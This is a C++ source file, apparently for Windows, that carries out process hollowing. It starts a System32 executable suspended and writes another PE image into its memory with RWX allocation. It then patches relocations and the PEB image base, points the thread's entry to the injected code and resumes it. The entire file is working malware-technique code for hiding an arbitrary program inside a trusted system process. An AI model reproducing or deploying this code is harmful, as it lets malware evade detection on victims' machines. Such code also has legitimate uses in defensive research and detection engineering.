#include "pch.h"

int wmain()
{
	std::wstring sourceAppPath;
	std::wstring targetAppPath;
	std::wstring workingDir;
	WCHAR wszPath[MAX_PATH];

	bool boRet = GetWorkingDirPathW(workingDir, true);
	if (FALSE == boRet)
	{
		return 0;
	}

	sourceAppPath = workingDir;
	sourceAppPath += SOURCE_APP_NAME;

	DWORD dwRetVal = GetWindowsDirectoryW(wszPath, MAX_PATH);
	if (0 == dwRetVal)
	{
		return 0;
	}

	targetAppPath.assign(wszPath);
	targetAppPath.append(L"\\System32\\");
	targetAppPath.append(TARGET_APP_NAME);

	ProcessHollowing ProcHollowing(sourceAppPath, workingDir, targetAppPath);

	boRet = ProcHollowing.Init();
	if (false == boRet)
	{
		wprintf(L"Init failed");
		return 0;
	}

	boRet = ProcHollowing.CreateHollowedProcess();
	if (false == boRet)
	{
		wprintf(L"CreateHollowedProcess failed");
		return 0;
	}

	//ProcHollowing.WaitForTargetProcess();

	ProcHollowing.Deinit();

	return 0;
}

bool ProcessHollowing::Init()
{
	m_pProcessInfo = new(std::nothrow) PROCESS_INFORMATION;
	if (NULL == m_pProcessInfo)
	{
		return false;
	}
	
	HMODULE ntdllHandle = GetModuleHandle(L"NTDLL.DLL");
	if (ntdllHandle == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	if (m_pfnQueryInformationProcess == nullptr)
	{
		m_pfnQueryInformationProcess = (PFN_NTQUERYINFORMATIONPROCESS)GetProcAddress(ntdllHandle, "NtQueryInformationProcess");
	}
	if (m_pfnQueryInformationProcess == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	if (m_pfnNtUnmapViewOfSection == nullptr)
	{
		m_pfnNtUnmapViewOfSection = (PFN_NTUNMAPVIEWOFSECTION)GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	}
	if (m_pfnNtUnmapViewOfSection == nullptr)
	{
		delete m_pProcessInfo;
		return false;
	}

	//	fixme: free ntdll

	return true;
}

bool ProcessHollowing::Deinit()
{
	if (m_pbyBuffer)
	{
		delete []m_pbyBuffer;
		m_pbyBuffer = nullptr;
	}

	CleanProcess(false);

	return true;
}

bool ProcessHollowing::CreateHollowedProcess()
{
	bool boRet;

	boRet = ReadSourceFile();
	if (false == boRet)
	{
		return boRet;
	}

	//	check if source file is valid pe or not
	boRet = IsPEFile(m_pbyBuffer);
	if (false == boRet)
	{
		return boRet;
	}

	boRet = ExecFile();
	if (false == boRet)
	{
		return boRet;
	}

	boRet = IsWow64Process(m_pProcessInfo->hProcess, &m_boTarget32BitProcess);
	if (false == boRet)
	{
		CleanProcess(true);
		return boRet;
	}

	boRet = GetProcessBaseAddress();
	if (false == boRet)
	{
		CleanProcess(true);
		return boRet;
	}

	m_boSource32BitProcess = IsPE32(m_pbyBuffer);

	if (
		(true == m_boSource32BitProcess && true == (bool)m_boTarget32BitProcess)	||
		(false == m_boSource32BitProcess && false == (bool)m_boTarget32BitProcess)
		)
	{
		//wprintf(L"\n CreateHollowedProcess: Architecture is compatible");
	}
	else
	{
		wprintf(L"\n CreateHollowedProcess: Architecture is not compatible");
		CleanProcess(true);
		return false;
	}


	DWORD dwSourceSubsystem = GetSubsytem(m_pbyBuffer, m_boSource32BitProcess);
	DWORD dwTargetSubsystem = GetSubsystemEx(m_pProcessInfo->hProcess, (LPVOID)m_baseAddress, m_boTarget32BitProcess);
	if (-1 == dwTargetSubsystem)
	{
		wprintf(L"\n CreateHollowedProcess: GetSubsystemEx failed.");
		CleanProcess(true);
		return false;
	}

	if (dwSourceSubsystem != dwTargetSubsystem)
	{
		wprintf(L"CreateHollowedProcess: Subsystem are not compatible.");
		CleanProcess(true);
		return false;
	}

	m_boRelocation = HasRelocation(m_pbyBuffer, m_boSource32BitProcess);

	boRet = RunPE();
	if (false == boRet)
	{
		wprintf(L"CreateHollowedProcess: RunPE failed.");
		CleanProcess(true);
		return false;
	}

	wprintf(L"\n Process hollowing complete.");

	return true;
}

bool ProcessHollowing::WaitForTargetProcess()
{
	DWORD dwErrorCode;
	DWORD dwResult;

	if (nullptr == m_pProcessInfo)
	{
		return false;
	}

	dwResult = WaitForSingleObject(m_pProcessInfo->hProcess, INFINITE);
	if (WAIT_OBJECT_0 != dwResult)
	{
		return false;
	}

	BOOL boResult = GetExitCodeProcess(m_pProcessInfo->hProcess, &dwErrorCode);
	if (FALSE == boResult)
	{
	}

	if (INVALID_HANDLE_VALUE != m_pProcessInfo->hThread)
	{
		CloseHandle(m_pProcessInfo->hThread);
		m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
	}

	if (INVALID_HANDLE_VALUE != m_pProcessInfo->hProcess)
	{
		CloseHandle(m_pProcessInfo->hProcess);
		m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
	}

	return true;
}

bool ProcessHollowing::RunPE()
{
	bool boRet;

	if (m_boSource32BitProcess)
	{
		if (m_boRelocation)
		{
			boRet = RunPEReloc32();
		}
		else
		{
			boRet = RunPE32();
		}
	}
	else
	{
		if (m_boRelocation)
		{
			boRet = RunPEReloc64();
		}
		else
		{
			boRet = RunPE64();
		}
	}

	return boRet;
}

bool ProcessHollowing::CleanProcess(bool boTerminate)
{
	if (m_pbyBuffer)
	{
		delete[]m_pbyBuffer;
		m_pbyBuffer = nullptr;
	}

	if (nullptr != m_pProcessInfo)
	{
		if (INVALID_HANDLE_VALUE != m_pProcessInfo->hThread)
		{
			CloseHandle(m_pProcessInfo->hThread);
			m_pProcessInfo->hThread = INVALID_HANDLE_VALUE;
		}

		if (INVALID_HANDLE_VALUE != m_pProcessInfo->hProcess)
		{
			if (boTerminate)
			{
				TerminateProcess(m_pProcessInfo->hProcess, (UINT)-1);
			}
			CloseHandle(m_pProcessInfo->hProcess);
			m_pProcessInfo->hProcess = INVALID_HANDLE_VALUE;
		}

		delete m_pProcessInfo;
		m_pProcessInfo = nullptr;
	}

	return true;
}

bool ProcessHollowing::ExecFile()
{
	BOOL boResult;
	STARTUPINFO StartupInfo;

	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);

	StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = m_boShowWindow ? SW_NORMAL : SW_HIDE;

	boResult = CreateProcessW(
		m_destProcessPath.c_str(),
		(LPWSTR)m_sourceModulePath.c_str(),
		NULL,
		NULL,
		TRUE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&StartupInfo,
		m_pProcessInfo
	);
	if (FALSE == boResult)
	{
		m_dwError = GetLastError();
		return false;
	}

	wprintf(L"ExecFile: CreateProcessW success with PID(%u)", m_pProcessInfo->dwProcessId);

	return true;
}

bool ProcessHollowing::GetProcessBaseAddress()
{
	BOOL bReadBaseAddress;
	if (m_boTarget32BitProcess)
	{
		WOW64_CONTEXT CTX = {};
		CTX.ContextFlags = CONTEXT_FULL;
		Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
		bReadBaseAddress = ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(uintptr_t)(CTX.Ebx + 0x8), &m_baseAddress, sizeof(DWORD), nullptr);
	}
	else
	{
		CONTEXT CTX = {};
		CTX.ContextFlags = CONTEXT_FULL;
		GetThreadContext(m_pProcessInfo->hThread, &CTX);
		bReadBaseAddress = ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &m_baseAddress, sizeof(UINT64), nullptr);
	}
	if (!m_baseAddress)
	{
		return false;
	}

	return true;
}

bool ProcessHollowing::ReadSourceFile()
{
	HANDLE hFile = CreateFile(m_sourceProcessPath.c_str(), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		return false;
	}

	m_sourceFileSize = GetFileSize(hFile, 0);

	m_pbyBuffer = new BYTE[m_sourceFileSize];

	DWORD dwBytesRead;
	BOOL boRet = ReadFile(hFile, m_pbyBuffer, m_sourceFileSize, &dwBytesRead, 0);
	if (FALSE == boRet || m_sourceFileSize != dwBytesRead)
	{
		CloseHandle(hFile);
		delete[] m_pbyBuffer;
		return false;
	}

	CloseHandle(hFile);
	return true;
}

bool ProcessHollowing::RunPE32()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		(LPVOID)(uintptr_t)lpImageNTHeader32->OptionalHeader.ImageBase,
		lpImageNTHeader32->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		wprintf(L"\n RunPE32:VirtualAllocEx failed with error(%u).", GetLastError());
		return false;
	}

	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, (LPVOID)m_pbyBuffer, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		VirtualFreeEx(m_pProcessInfo->hProcess, lpAllocAddress, 0, MEM_RELEASE);
		wprintf(L"\n RunPE32: WriteProcessMemory 1 failed with error(%u).", GetLastError());
		return false;
	}

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((uintptr_t)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			wprintf(L"\n RunPE32: WriteProcessMemory 2 failed with error(%u) for section(%S).", GetLastError(), (LPSTR)lpImageSectionHeader->Name);
			VirtualFreeEx(m_pProcessInfo->hProcess, lpAllocAddress, 0, MEM_RELEASE);
			return false;
		}
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		wprintf(L"\n RunPE32: Wow64GetThreadContext failed with error(%u).", GetLastError());
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpImageNTHeader32->OptionalHeader.ImageBase, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		wprintf(L"\n RunPE32: WriteProcessMemory 3 failed with error(%u).", GetLastError());
		return FALSE;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		wprintf(L"\n RunPE32: Wow64SetThreadContext failed with error(%u).", GetLastError());
		return FALSE;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return true;
}

bool ProcessHollowing::RunPE64()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(m_pProcessInfo->hProcess, (LPVOID)lpImageNTHeader64->OptionalHeader.ImageBase, lpImageNTHeader64->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			return false;
		}
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		return FALSE;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return FALSE;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return TRUE;
}

bool ProcessHollowing::RunPEReloc32()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader32 = (PIMAGE_NT_HEADERS32)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		nullptr,
		lpImageNTHeader32->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const DWORD DeltaImageBase = (DWORD)((DWORD64)lpAllocAddress - lpImageNTHeader32->OptionalHeader.ImageBase);

	lpImageNTHeader32->OptionalHeader.ImageBase = (DWORD)(DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader32->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	IMAGE_DATA_DIRECTORY ImageDataReloc;
	bool boRet = GetRelocAddress(m_pbyBuffer, &ImageDataReloc, m_boSource32BitProcess);
	if (false == boRet)
	{
		return false;
	}

	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader32->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader32 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader32->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(
			m_pProcessInfo->hProcess,
			(LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress),
			(LPVOID)((uintptr_t)m_pbyBuffer + lpImageSectionHeader->PointerToRawData),
			lpImageSectionHeader->SizeOfRawData,
			nullptr
		);
		if (!bWriteSection)
		{
			return false;
		}
	}

	if (lpImageRelocSection == nullptr)
	{
		return false;
	}

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD PatchedAddress = 0;

			ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD), nullptr);
		}
	}

	WOW64_CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = Wow64GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return false;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((uintptr_t)CTX.Ebx + 0x8), &lpAllocAddress, sizeof(DWORD), nullptr);
	if (!bWritePEB)
	{
		return false;
	}

	CTX.Eax = (DWORD)((uintptr_t)lpAllocAddress + lpImageNTHeader32->OptionalHeader.AddressOfEntryPoint);

	const BOOL bSetContext = Wow64SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return false;
	}

	ResumeThread(m_pProcessInfo->hThread);

	return true;
}

bool ProcessHollowing::RunPEReloc64()
{
	LPVOID lpAllocAddress;

	const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)m_pbyBuffer;
	const auto lpImageNTHeader64 = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImageDOSHeader + lpImageDOSHeader->e_lfanew);

	lpAllocAddress = VirtualAllocEx(
		m_pProcessInfo->hProcess,
		nullptr,
		lpImageNTHeader64->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (lpAllocAddress == nullptr)
	{
		return false;
	}

	const DWORD64 DeltaImageBase = (DWORD64)lpAllocAddress - lpImageNTHeader64->OptionalHeader.ImageBase;

	lpImageNTHeader64->OptionalHeader.ImageBase = (DWORD64)lpAllocAddress;
	const BOOL bWriteHeaders = WriteProcessMemory(m_pProcessInfo->hProcess, lpAllocAddress, m_pbyBuffer, lpImageNTHeader64->OptionalHeader.SizeOfHeaders, nullptr);
	if (!bWriteHeaders)
	{
		return false;
	}

	IMAGE_DATA_DIRECTORY ImageDataReloc;
	bool boRes = GetRelocAddress(m_pbyBuffer, &ImageDataReloc, m_boSource32BitProcess);
	if (false == boRes)
	{
		return boRes;
	}
	PIMAGE_SECTION_HEADER lpImageRelocSection = nullptr;

	for (int i = 0; i < lpImageNTHeader64->FileHeader.NumberOfSections; i++)
	{
		const auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader64 + 4 + sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader64->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (ImageDataReloc.VirtualAddress >= lpImageSectionHeader->VirtualAddress && ImageDataReloc.VirtualAddress < (lpImageSectionHeader->VirtualAddress + lpImageSectionHeader->Misc.VirtualSize))
			lpImageRelocSection = lpImageSectionHeader;

		const BOOL bWriteSection = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)((UINT64)lpAllocAddress + lpImageSectionHeader->VirtualAddress), (LPVOID)((UINT64)m_pbyBuffer + lpImageSectionHeader->PointerToRawData), lpImageSectionHeader->SizeOfRawData, nullptr);
		if (!bWriteSection)
		{
			return false;
		}
	}

	if (lpImageRelocSection == nullptr)
	{
		return false;
	}

	DWORD RelocOffset = 0;

	while (RelocOffset < ImageDataReloc.Size)
	{
		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)m_pbyBuffer + lpImageRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (lpImageRelocationEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)lpAllocAddress + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
			DWORD64 PatchedAddress = 0;

			ReadProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);

			PatchedAddress += DeltaImageBase;

			WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
		}
	}

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bGetContext)
	{
		return false;
	}

	const BOOL bWritePEB = WriteProcessMemory(m_pProcessInfo->hProcess, (LPVOID)(CTX.Rdx + 0x10), &lpImageNTHeader64->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		return false;
	}

	CTX.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader64->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(m_pProcessInfo->hThread, &CTX);
	if (!bSetContext)
	{
		return false;
	}

	DWORD dwRes = ResumeThread(m_pProcessInfo->hThread);
	if (-1 == dwRes)
	{
		return false;
	}

	return true;
}